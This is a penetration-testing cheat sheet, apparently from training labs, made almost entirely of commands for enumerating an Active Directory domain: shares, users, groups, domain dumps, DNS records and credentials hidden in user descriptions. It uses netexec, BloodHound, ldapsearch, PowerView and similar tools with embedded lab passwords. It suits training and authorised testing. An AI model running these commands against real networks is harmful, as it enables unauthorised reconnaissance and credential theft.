- [ ] Shares Enumeration
- [ ] Users Enumeration
- [ ] Domain Dump - Ldap | Bloodhound
- [ ] Creds In Description
- [ ] DNS Records
- [ ] PASSWD_NOTREQD Field

Shares Enumeration!!!
```sh
nxc smb 10.129.234.173 -u jbader -p 'ILovePower333###' --shares

smbmap -H 10.129.234.173 -u jbader -p 'ILovePower333###' -d inlanefreight.local

smbclient \\\\10.129.234.173\\Finance -U inlanefreight/jbade

impacket-smbclient INLANEFREIGHT.LOCAL/ssmalls:'Password123!'@172.16.8.3

nxc smb 10.129.234.173 -u jbader -p 'ILovePower333###' -M spider_plus -o DOWNLOAD_FLAG=True -o OUTPUT_FOLDER=./out --smb-timeout 60

docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 172.16.8.3 -t 256 -d INLANEFREIGHT.LOCAL -c 'passw' -u backupjob -p 'lucky7' --sharenames Finance Marketing Sales
```
Users Enumeration!!!
```sh
lookupsid.py jwegman:Roasty07@ad.trilocor.local | grep SidTypeUser | cut -d ' ' -f 2 | cut -d '\' -f 2 | grep -v '\$$' > users.txt

nxc smb 10.129.234.173 -u jbader -p 'ILovePower333###' --users
rpcclient -U "forend%Klmcargo2" 172.16.5.5
rpcclient $> enumdomusers
# Group Membership
nxc ldap 10.129.234.173 -u jbader -p 'ILovePower333###' -M groupmembership -o USER="ankur"
# Group Members
nxc ldap 10.129.234.173 -u jbader -p 'ILovePower333###' --groups "Domain Admins"
```
Domain Dump!!!
```sh
ldapdomaindump  'ldap://corp.local' -u 'corp.local\helpdesk' -p 'YourS3cret' -o lootme

docker run -v ${PWD}:/bloodhound-data -it bloodhound
bloodhound-python -c All -d inlanefreight.local -u forend -p 'Klmcargo2' -ns 172.16.5.5 --zip
echo "172.16.139.3 ad.trilocor.local dc01.ad.trilocor.local" | tee -a /etc/hosts
bloodhound-python -c All -d ad.trilocor.local -u 'srv01$' -k --auth-method kerberos -ns 172.16.139.3 --zip

pywerview get-netuser  -w ILF.local -u jmarston -p 'P@ssword!' -t 10.129.43.20 --username jmarston
```
Creds In Description!!!
```sh
# ldapsearch
ldapsearch -x -H ldap://172.16.5.5 -D "Asmith@INLANEFREIGHT.LOCAL" -w "Welcome1" -b "DC=INLANEFREIGHT,DC=LOCAL" "(&(objectCategory=person)(objectClass=user)(description=*))" samaccountname description | grep -E "sAMAccountName|description"
# netexec
nxc ldap 172.16.5.5 -u '' -p '' -M get-desc-users
# bloodyAD
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(|(userPassword=*)(unixUserPassword=*)(unicodePassword=*)(description=*))' --attr userPassword,unixUserPassword,unicodePwd,description
# PowerView
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```
DNS Records!!!
```sh
# adidnsdump
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
# ref
https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/
```
PASSWD_NOTREQD Field!!!
```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

Get-DomainComputer -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

